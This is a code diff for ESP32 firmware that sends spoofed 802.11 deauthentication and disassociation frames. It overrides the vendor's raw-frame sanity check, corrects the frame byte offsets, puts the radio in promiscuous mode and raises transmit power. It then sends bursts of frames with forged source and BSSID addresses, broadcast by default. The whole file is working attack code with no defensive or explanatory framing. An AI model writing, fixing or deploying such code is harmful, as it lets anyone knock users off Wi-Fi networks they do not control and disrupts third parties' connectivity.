@@ -6,99 +6,94 @@
 #include "esp_wifi.h"
 #include "esp_system.h"
 
-extern "C" int custom_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-    if (arg == 31337)
-        return 1;
-    return 0;
+extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+  if (arg == 31337)
+    return 1;
+  return 0;
 }
-#define ieee80211_raw_frame_sanity_check custom_ieee80211_raw_frame_sanity_check
 
+// 802.11-Management-Frame
+// Offset: 0 FC | 2 Duration | 4 DA | 10 SA | 16 BSSID | 22 Seq | 24 Reason
 static const uint8_t deauth_frame_template[] = {
-    0x08, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00,
-    0xC0, 0x00,
-    0x3A, 0x01,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0xF0, 0xFF,
-    0x07, 0x00
+  0xC0, 0x00,                         // Frame Control: Deauthentication
+  0x00, 0x00,                         // Duration
+  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+  0x00, 0x00,                         // Sequence Control
+  0x07, 0x00                          // Reason Code 7
 };
 
 void init_deauth_wifi() {
-    WiFi.mode(WIFI_STA);
-    esp_wifi_set_promiscuous(true);
-    esp_wifi_set_promiscuous_filter(NULL);
-    esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
-    esp_wifi_config_80211_tx_rate(WIFI_IF_STA, WIFI_PHY_RATE_11M_L);
-    esp_wifi_set_max_tx_power(84); // 21 dBm
-    Serial.println("WiFi initialized for deauth");
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+  WiFi.disconnect(true);
+  WiFi.mode(WIFI_OFF);
+  delay(100);
+
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(50);
+
+  esp_wifi_set_promiscuous(true);
+  wifi_promiscuous_filter_t filt = {
+    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
+  };
+  esp_wifi_set_promiscuous_filter(&filt);
+
+  esp_wifi_set_protocol(WIFI_IF_STA, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
+  esp_wifi_set_ps(WIFI_PS_NONE);
+  esp_wifi_set_max_tx_power(78);
+
+  Serial.println(F("WiFi initialized for deauth"));
 }
 
-/**
- * @brief Sends raw frame using esp_wifi_80211_tx
- */
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
-    esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
-    if (result == ESP_OK) {
-        Serial.println(" -> Sent frame");
-    } else {
-        Serial.print(" -> Failed to send frame: ");
-        Serial.println(result, HEX);
-    }
+  esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
+  if (result != ESP_OK) {
+    Serial.print(F(" -> Failed to send frame: 0x"));
+    Serial.println(result, HEX);
+  }
 }
 
-/**
- * @brief Prepares and sends management frame (deauth or disassociate)
- * 
- * @param chan Channel
- * @param receiverMAC Receiver MAC
- * @param sourceMAC Source MAC
- * @param bssidMAC BSSID MAC
- * @param frame_type Frame type (0xc0 deauth, 0xa0 disassociate)
- * @param reason Reason code
- */
-void wsl_bypasser_send_deauth_frame(uint8_t chan, uint8_t *receiverMAC, uint8_t *sourceMAC, uint8_t *bssidMAC, uint8_t frame_type = 0xC0, uint16_t reason = 0x0007) {
-    Serial.print("Preparing frame to receiver ");
-    for (int j = 0; j < 6; j++) {
-        Serial.print(receiverMAC[j], HEX);
-        if (j < 5) Serial.print(":");
-    }
-    Serial.print(" from source ");
-    for (int j = 0; j < 6; j++) {
-        Serial.print(sourceMAC[j], HEX);
-        if (j < 5) Serial.print(":");
-    }
-    Serial.println();
+void wsl_bypasser_send_deauth_frame(
+  uint8_t chan,
+  uint8_t *receiverMAC,
+  uint8_t *sourceMAC,
+  uint8_t *bssidMAC,
+  uint8_t frame_type = 0xC0,
+  uint16_t reason = 0x0007
+) {
+  if (esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE) != ESP_OK) {
+    Serial.println(F("Failed to set channel"));
+    return;
+  }
 
-    esp_err_t chanResult = esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
-    if (chanResult != ESP_OK) {
-        Serial.print("Failed to set channel: ");
-        Serial.println(chanResult, HEX);
-        return;
-    }
-    delay(50);
+  uint8_t frame[sizeof(deauth_frame_template)];
+  memcpy(frame, deauth_frame_template, sizeof(deauth_frame_template));
 
-    uint8_t frame[sizeof(deauth_frame_template)];
-    memcpy(frame, deauth_frame_template, sizeof(deauth_frame_template));
+  // Frame Control
+  frame[0] = frame_type;  // 0xC0 Deauth, 0xA0 Disassoc
+  frame[1] = 0x00;
 
-    frame[8] = frame_type;
+  // Adresses
+  memcpy(frame + 4,  receiverMAC, 6);  // DA
+  memcpy(frame + 10, sourceMAC,   6);  // SA
+  memcpy(frame + 16, bssidMAC,    6);  // BSSID
 
-    memcpy(frame + 12, receiverMAC, 6);
-    memcpy(frame + 18, sourceMAC, 6);
-    memcpy(frame + 24, bssidMAC, 6);
+  // Sequence (Fragment = 0)
+  uint16_t seqNum = (uint16_t)(random(0, 4096) << 4);
+  frame[22] = seqNum & 0xFF;
+  frame[23] = (seqNum >> 8) & 0xFF;
 
-    uint16_t seqNum = random(0, 4096) << 4;
-    frame[30] = seqNum & 0xFF;
-    frame[31] = (seqNum >> 8) & 0xFF;
+  // Reason
+  frame[24] = reason & 0xFF;
+  frame[25] = (reason >> 8) & 0xFF;
 
-    frame[32] = reason & 0xFF;
-    frame[33] = (reason >> 8) & 0xFF;
-
-    for (int i = 0; i < 3; i++) {
-        wsl_bypasser_send_raw_frame(frame, sizeof(frame));
-        delay(10);
-    }
+  for (int i = 0; i < 4; i++) {
+    wsl_bypasser_send_raw_frame(frame, sizeof(frame));
+    delay(1);
+  }
 }
 
 #endif
